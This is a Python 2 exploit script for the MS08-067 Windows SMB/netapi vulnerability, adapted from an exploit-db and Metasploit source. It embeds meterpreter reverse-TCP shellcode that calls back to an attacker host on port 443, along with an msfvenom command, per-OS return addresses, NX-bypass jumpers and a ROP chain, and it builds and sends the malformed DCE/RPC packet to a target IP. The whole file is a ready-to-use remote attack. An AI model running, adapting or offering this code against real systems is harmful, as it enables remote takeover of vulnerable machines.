import struct
import time
import sys


from threading import Thread    #Thread is imported incase you would like to modify


try:

    from impacket import smb

    from impacket import uuid

    from impacket import dcerpc

    from impacket.dcerpc.v5 import transport


except ImportError, _:

    print 'Install the following library to make this script work'

    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'

    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'

    sys.exit(1)


print '#######################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'

print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'

print '#######################################################################\n'


#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important!
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x2b\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81"
shellcode += "\x76\x0e\xb7\xdd\x9e\xe0\x83\xee\xfc\xe2\xf4\x4b\x35"
shellcode += "\x1c\xe0\xb7\xdd\xfe\x69\x52\xec\x5e\x84\x3c\x8d\xae"
shellcode += "\x6b\xe5\xd1\x15\xb2\xa3\x56\xec\xc8\xb8\x6a\xd4\xc6"
shellcode += "\x86\x22\x32\xdc\xd6\xa1\x9c\xcc\x97\x1c\x51\xed\xb6"
shellcode += "\x1a\x7c\x12\xe5\x8a\x15\xb2\xa7\x56\xd4\xdc\x3c\x91"
shellcode += "\x8f\x98\x54\x95\x9f\x31\xe6\x56\xc7\xc0\xb6\x0e\x15"
shellcode += "\xa9\xaf\x3e\xa4\xa9\x3c\xe9\x15\xe1\x61\xec\x61\x4c"
shellcode += "\x76\x12\x93\xe1\x70\xe5\x7e\x95\x41\xde\xe3\x18\x8c"
shellcode += "\xa0\xba\x95\x53\x85\x15\xb8\x93\xdc\x4d\x86\x3c\xd1"
shellcode += "\xd5\x6b\xef\xc1\x9f\x33\x3c\xd9\x15\xe1\x67\x54\xda"
shellcode += "\xc4\x93\x86\xc5\x81\xee\x87\xcf\x1f\x57\x82\xc1\xba"
shellcode += "\x3c\xcf\x75\x6d\xea\xb5\xad\xd2\xb7\xdd\xf6\x97\xc4"
shellcode += "\xef\xc1\xb4\xdf\x91\xe9\xc6\xb0\x22\x4b\x58\x27\xdc"
shellcode += "\x9e\xe0\x9e\x19\xca\xb0\xdf\xf4\x1e\x8b\xb7\x22\x4b"
shellcode += "\x8a\xb2\xb5\x5e\x48\xa9\x90\xf6\xe2\xb7\xdc\x25\x69"
shellcode += "\x51\x8d\xce\xb0\xe7\x9d\xce\xa0\xe7\xb5\x74\xef\x68"
shellcode += "\x3d\x61\x35\x20\xb7\x8e\xb6\xe0\xb5\x07\x45\xc3\xbc"
shellcode += "\x61\x35\x32\x1d\xea\xea\x48\x93\x96\x95\x5b\x35\xff"
shellcode += "\xe0\xb7\xdd\xf4\xe0\xdd\xd9\xc8\xb7\xdf\xdf\x47\x28"
shellcode += "\xe8\x22\x4b\x63\x4f\xdd\xe0\xd6\x3c\xeb\xf4\xa0\xdf"
shellcode += "\xdd\x8e\xe0\xb7\x8b\xf4\xe0\xdf\x85\x3a\xb3\x52\x22"
shellcode += "\x4b\x73\xe4\xb7\x9e\xb6\xe4\x8a\xf6\xe2\x6e\x15\xc1"
shellcode += "\x1f\x62\x5e\x66\xe0\xca\xff\xc6\x88\xb7\x9d\x9e\xe0"
shellcode += "\xdd\xdd\xce\x88\xbc\xf2\x91\xd0\x48\x08\xc9\x88\xc2"
shellcode += "\xb3\xd3\x81\x48\x08\xc0\xbe\x48\xd1\xba\x09\xc6\x22"
shellcode += "\x61\x1f\xb6\x1e\xb7\x26\xc2\x1a\x5d\x5b\x57\xc0\xb4"
shellcode += "\xea\xdf\x7b\x0b\x5d\x2a\x22\x4b\xdc\xb1\xa1\x94\x60"
shellcode += "\x4c\x3d\xeb\xe5\x0c\x9a\x8d\x92\xd8\xb7\x9e\xb3\x48"
shellcode += "\x08\x9e\xe0"

nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port   = port

        self.target   = target
	self.os	      = os


    def __DCEPacket(self):
	if (self.os=='1'):
		print 'Windows XP SP0/SP1 Universal\n'
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print 'Windows 2000 Universal\n'
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print 'Windows 2003 SP0 Universal\n'
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print 'Windows 2003 SP1 English\n'
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print 'Windows XP SP3 French (NX)\n'
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print 'Windows XP SP3 English (NX)\n'
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print 'Windows XP SP3 English (AlwaysOn NX)\n'
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print 'Not supported OS version\n'
		sys.exit(-1)
	print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))




        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + shellcode +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return



    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'



if __name__ == '__main__':

       try:

           target = sys.argv[1]
	   os = sys.argv[2]

       except IndexError:

				print '\nUsage: %s <target ip>\n' % sys.argv[0]

				print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
				print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'

				sys.exit(-1)



current = SRVSVC_Exploit(target, os)

current.start()
